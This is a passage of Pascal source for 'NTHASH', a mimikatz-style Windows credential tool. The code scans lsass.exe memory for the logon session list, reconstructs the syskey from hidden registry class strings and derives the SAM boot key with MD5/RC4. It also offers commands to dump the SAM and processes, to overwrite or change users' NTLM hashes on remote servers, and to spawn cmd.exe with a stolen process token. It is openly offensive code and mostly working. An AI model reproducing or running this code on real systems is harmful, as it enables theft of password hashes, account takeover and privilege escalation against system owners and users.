                            //offset:=search(hprocess,addr,MODINFO.SizeOfImage);
                            log('Searching...',0);
                            offset:=searchmem(hprocess,addr,MODINFO.SizeOfImage,WN1703_LogonSessionList);
                            log('Done!',0);
                            if offset<>0 then
                                 begin
                                 log('found:'+inttohex(offset,sizeof(pointer)),0);
                                 //
                                 if ReadMem  (hprocess,offset+patch_pos,offset_list) then
                                   begin
                                   CopyMemory(@offset_list_dword,@offset_list[0],4);
                                   log('ReadProcessMemory OK '+inttohex(offset_list_dword+4,4));
                                   //we now should get a match with dd Lsasrv!LogonSessionList
                                   log(inttohex(offset+offset_list_dword+4+patch_pos,sizeof(pointer)));

                                   end; //if readmem
                                 end;
                            {//test - lets read first 4 bytes of our module
                             //can be verified with process hacker
                            if ReadProcessMemory( hprocess,addr,@buffer[0],4,@read) then
                               begin
                               log('ReadProcessMemory OK');
                               log(inttohex(buffer[0],1)+inttohex(buffer[1],1)+inttohex(buffer[2],1)+inttohex(buffer[3],1));
                               end;
                            }
                            end;//if GetModuleInformation...
                         end; //if pos('samsrv.dll',dummy)>0 then
                      end; //if GetModuleFileNameExA
                   end; //for count:=0...
               end; //if EnumProcessModules...
       closehandle(hprocess);
       end;//if openprocess...

end;


function getclass(rootkey:hkey;keyname,valuename:string;var bytes:array of byte):boolean;
var
  ret:long;
  hKeyReg,topKey,hSubKey:thandle;
  dwDisposition:dword=0;
  classSize:dword;
  classStr:array [0..15] of widechar;
  i:byte=0;
begin
result:=false;
ret := RegCreateKeyEx(rootkey,pchar(keyName),0,nil,REG_OPTION_NON_VOLATILE,KEY_QUERY_VALUE,nil,topKey,@dwDisposition);
if ret=error_success then
  begin
  if (RegOpenKeyEx(topKey,pchar(valueName),0,KEY_READ,hSubKey)=ERROR_SUCCESS) then
    begin
    classSize := 8+1;
    fillchar(classStr ,sizeof(classStr ),0);
    ret := RegQueryInfoKeyw(hSubKey,@classStr[0],@classSize,nil,nil,nil,nil,nil,nil,nil,nil,nil);
    if (classSize=8) then
      begin
       while i<8 do
             begin
             bytes[i div 2]:=strtoint('$'+classStr[I]+classStr[i+1]);
             inc(I,2);
             end;
       result:=true;
       end;//if (classSize=8) then
    RegCloseKey(hSubKey);
    end;
  RegCloseKey(topKey);
  end;
end;

{*
 * Get hidden syskey encoded bytes part in class string of a reg key
 * (JD, Skew1, GBG, Data)
 *}
function get_encoded_syskey(var bytes:array of byte):boolean;
const keys:array[0..3] of string=('JD','Skew1','GBG','Data');
var
  i:byte;
  enc_bytes:array[0..3] of byte;
begin
result:=false;
for i:=0 to length(keys)-1 do
    begin
    getclass (HKEY_LOCAL_MACHINE ,'SYSTEM\CurrentControlSet\Control\Lsa',keys[i],enc_bytes);
    CopyMemory (@bytes[i*4],@enc_bytes[0],4);
    end;
result:=true;
end;

//see kuhl_m_lsadump_getSamKey in kuhl_m_lsadump_getSamKey
function gethashedbootkey(salt,samkey,syskey:array of byte;var bootkey:tbyte16):boolean;
const
  SAM_QWERTY:pchar='!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0';
  SAM_NUM:pchar='0123456789012345678901234567890123456789\0';
var
  md5ctx:md5_ctx;
  data:PCRYPTO_BUFFER; //= (SAM_KEY_DATA_KEY_LENGTH, SAM_KEY_DATA_KEY_LENGTH, samKey),
  key:_CRYPTO_BUFFER; // = (MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest);
  status:ntstatus;
begin
//based on the first byte of F
//md5/rc4 on "old" ntlm
MD5Init(md5ctx);
	MD5Update(md5ctx,salt ,16); //F[0x70:0x80]=SALT
	MD5Update(md5ctx,SAM_QWERTY,lstrlen(SAM_QWERTY)+1);
	MD5Update(md5ctx,syskey,sizeof(syskey));
	MD5Update(md5ctx,SAM_NUM,lstrlen(SAM_NUM)+1);
	MD5Final(md5ctx); //rc4_key = MD5(F[0x70:0x80] + aqwerty + bootkey + anum)
        data:=allocmem(sizeof(_CRYPTO_BUFFER));
        data.Length :=SAM_KEY_DATA_KEY_LENGTH;
        data.MaximumLength :=SAM_KEY_DATA_KEY_LENGTH;
        data.Buffer :=samkey; //F[0x80:0xA0]=SAMKEY
        key.Length:=MD5_DIGEST_LENGTH;
        key.MaximumLength:=MD5_DIGEST_LENGTH;
        key.Buffer:=md5ctx.digest ;
        status:=RtlEncryptDecryptRC4(data,@key);
        writeln(status);
//we should cover AES/DES on new "ntlm"
end;

//also known as bootkey
function getsyskey:boolean;
const
  syskeyPerm:array[0..15] of byte=($8,$5,$4,$2,$b,$9,$d,$3,$0,$6,$1,$c,$e,$a,$f,$7);
var
  salt,bytes:array[0..15] of byte;
  syskey:array[0..15] of byte;
  samkey:array[0..31] of byte;
  i:byte;
  ret:long;
  topkey:thandle;
  dwDisposition:dword=0;
  sam:array[0..1023] of byte;
  cbdata,lptype:dword;
  dummy:string;
begin
//get the encoded syskey
get_encoded_syskey(bytes);
//Get syskey raw bytes (using permutation)
for i:=0 to sizeof(bytes)-1 do syskey[i] := bytes[syskeyPerm[i]];
dummy:=HashByteToString (tbyte16(syskey));
writeln(dummy);
exit; //for now
writeln;
//only if run as system
ret := RegCreateKeyEx(HKEY_LOCAL_MACHINE ,pchar('SAM\sam\Domains\account'),0,nil,REG_OPTION_NON_VOLATILE,KEY_READ,nil,topKey,@dwDisposition);
//ret:=RegOpenKeyEx(HKEY_LOCAL_MACHINE, 'SAM\sam\Domains\account',0, KEY_READ, topkey);
if ret=0 then
  begin
  writeln('RegCreateKeyEx OK');
  cbdata:=sizeof(sam);
  //contains our salt and encrypted sam key
  ret := RegQueryValueex (topkey,pchar('F'),nil,@lptype,@sam[0],@cbdata);
  if ret=0 then
     begin
     writeln('RegQueryValue OK');
     writeln(sam[0]);
     end
     else writeln(ret);
  end;
RegCloseKey(topkey);
end;

function createprocessaspid(ApplicationName: string;pid:string     ):boolean;
var
  StartupInfo: TStartupInfoW;
  ProcessInformation: TProcessInformation;
  i:byte;
begin
ZeroMemory(@StartupInfo, SizeOf(TStartupInfoW));
  FillChar(StartupInfo, SizeOf(TStartupInfoW), 0);
  StartupInfo.cb := SizeOf(TStartupInfoW);
  StartupInfo.lpDesktop := 'WinSta0\Default';
  for i:=3 downto 0 do
    begin
    result:= CreateProcessAsSystemW_Vista(PWideChar(WideString(ApplicationName)),PWideChar(WideString('')),NORMAL_PRIORITY_CLASS,
    nil,nil,
    StartupInfo,ProcessInformation,
    TIntegrityLevel(i),
    strtoint(pid ));
    if result then break;
    end;
end;

begin
  log('NTHASH 1.0 by erwan2212@gmail.com',1);
  winver:=GetWindowsVer;
  osarch:=getenv('PROCESSOR_ARCHITECTURE');
  log('Windows Version:'+winver,1);
  log('Architecture:'+osarch,1);
  log('DebugPrivilege:'+BoolToStr (EnableDebugPriv),1);
  lsass_pid:=_FindPid('lsass.exe');
  log('LSASS PID:'+inttostr(lsass_pid ),1);
  getmem(sysdir,Max_Path );
  GetSystemDirectory(sysdir, MAX_PATH - 1);
  //
  if paramcount=0 then
  begin
  log('NTHASH /setntlm [/server:hostname] /user:username /newhash:xxx',1);
  log('NTHASH /setntlm [/server:hostname] /user:username /newpwd:xxx',1);
  log('NTHASH /changentlm [/server:hostname] /user:username /oldpwd:xxx /newpwd:xxx',1);
  log('NTHASH /changentlm [/server:hostname] /user:username /oldhash:xxx /newpwd:xxx',1);
  log('NTHASH /changentlm [/server:hostname] /user:username /oldpwd:xxx /newhash:xxx',1);
  log('NTHASH /changentlm [/server:hostname] /user:username /oldhash:xxx /newhash:xxx',1);
  log('NTHASH /gethash /password:password',1);
  log('NTHASH /getsid /user:username [/server:hostname]',1);
  log('NTHASH /getusers [/server:hostname]',1);
  log('NTHASH /getdomains [/server:hostname]',1);
  log('NTHASH /dumpsam',1);
  log('NTHASH /getsyskey',1);
  log('NTHASH /runasuser /user:username /password:password',1);
  log('NTHASH /runastoken /pid:12345',1);
  log('NTHASH /dumpprocess /pid:12345',1);
  log('NTHASH /a_command /verbose',1);
  end;
  //
  p:=pos('/verbose',cmdline);
  if p>0 then verbose:=true;
  //
  //logon list located in memory
  //now need to get lsakeys to decrypt crdentials
  //dumplogons (lsass_pid,'');

  //exit;
  //
  p:=pos('/getsyskey',cmdline);
  if p>0 then
     begin
     getsyskey;
     exit;
     end;
  p:=pos('/pid:',cmdline);
  if p>0 then
       begin
       pid:=copy(cmdline,p,255);
       pid:=stringreplace(pid,'/pid:','',[rfReplaceAll, rfIgnoreCase]);
       delete(pid,pos(' ',pid),255);
       //log(server);
       end;
  p:=pos('/dumpprocess',cmdline);
  if p>0 then
     begin
     if pid='' then exit;
     if dumpprocess (strtoint(pid)) then log('OK',1) else log('NOT OK',1);
     exit;
     end;
  p:=pos('/dumpsam',cmdline);
  if p>0 then
     begin
     dumpsam (lsass_pid ,'');
     exit;
     end;
  p:=pos('/server:',cmdline);
  if p>0 then
       begin
       server:=copy(cmdline,p,255);
       server:=stringreplace(server,'/server:','',[rfReplaceAll, rfIgnoreCase]);
       delete(server,pos(' ',server),255);
       //log(server);
       end;
  p:=pos('/user:',cmdline);
    if p>0 then
         begin
         user:=copy(cmdline,p,255);
         user:=stringreplace(user,'/user:','',[rfReplaceAll, rfIgnoreCase]);
         delete(user,pos(' ',user),255);
         //log(user);
         end;
    p:=pos('/password:',cmdline);
      if p>0 then
           begin
           password:=copy(cmdline,p,255);
           password:=stringreplace(password,'/password:','',[rfReplaceAll, rfIgnoreCase]);
           delete(user,pos(' ',password),255);
           //log(user);
           end;
    p:=pos('/gethash',cmdline);
      if p>0 then
           begin
           log (GenerateNTLMHash (password),1);
           exit;
           end;
  p:=pos('/getusers',cmdline);
  if p>0 then
       begin
       QueryUsers (pchar(server),'',nil );
       exit;
       end;
  p:=pos('/getdomains',cmdline);
  if p>0 then
       begin
       QueryDomains (pchar(server),nil );
       exit;
       end;
  p:=pos('/getsid',cmdline);
  if p>0 then
       begin
       GetAccountSid2(widestring(server),widestring(user),mypsid);
       ConvertSidToStringSid (mypsid,mystringsid);
       log(mystringsid,1);
       exit;
       end;
  p:=pos('/oldhash:',cmdline);
  if p>0 then
       begin
       oldhash:=copy(cmdline,p,255);
       oldhash:=stringreplace(oldhash,'/oldhash:','',[rfReplaceAll, rfIgnoreCase]);
       delete(oldhash,pos(' ',oldhash),255);
       //log(oldhash);
       end;
  p:=pos('/newhash:',cmdline);
  if p>0 then
       begin
       newhash:=copy(cmdline,p,255);
       newhash:=stringreplace(newhash,'/newhash:','',[rfReplaceAll, rfIgnoreCase]);
       delete(newhash,pos(' ',newhash),255);
       //log(newhash);
       end;
  p:=pos('/oldpwd:',cmdline);
  if p>0 then
       begin
       oldpwd:=copy(cmdline,p,255);
       oldpwd:=stringreplace(oldpwd,'/oldpwd:','',[rfReplaceAll, rfIgnoreCase]);
       delete(oldpwd,pos(' ',oldpwd),255);
       //log(oldpwd);
       end;
  p:=pos('/newpwd:',cmdline);
  if p>0 then
       begin
       newpwd:=copy(cmdline,p,255);
       newpwd:=stringreplace(newpwd,'/newpwd:','',[rfReplaceAll, rfIgnoreCase]);
       delete(newpwd,pos(' ',newpwd),255);
       //log(newpwd);
       end;
  p:=pos('/setntlm',cmdline);
  if p>0 then
       begin
       if newhash<>'' then newhashbyte :=HashStringToByte (newhash);
       if newpwd<>'' then newhash:=GenerateNTLMHash (newpwd);
       if SetInfoUser (server,user, HashStringToByte (newhash))
          then log('Done',1)
          else log('Failed',1);
       end;
  p:=pos('/changentlm',cmdline);
  if p>0 then
       begin
       if oldpwd<>'' then oldhashbyte:=tbyte16(GenerateNTLMHashByte (oldpwd));
       if newpwd<>'' then newhashbyte:=tbyte16(GenerateNTLMHashByte (newpwd));
       if oldhash<>'' then oldhashbyte :=HashStringToByte (oldhash);
       if newhash<>'' then newhashbyte :=HashStringToByte (newhash);
       if _ChangeNTLM(server,user,oldhashbyte ,newhashbyte)
          then log('Done',1)
          else log('Failed',1);
       end;
  p:=pos('/runastoken',cmdline);
  if p>0 then
     begin
     if pid='' then exit;
     if createprocessaspid   (sysdir+'\cmd.Exe',pid) then log('OK',1) else log('NOT OK',1);
     exit;
     end;
  p:=pos('/runasuser',cmdline);
  if p>0 then
     begin
     if CreateProcessAsLogon (user,password,sysdir+'\cmd.Exe','')=0
        then log('Done',1)
        else log('Failed',1);
     //WriteLn(Impersonate('l4mpje','Password123')) ;
     //writeln(GetLastError );
     //WriteLn (GetCurrUserName);
     //RevertToSelf ;
     //writeln(GetCurrUserName );
     end;


end.

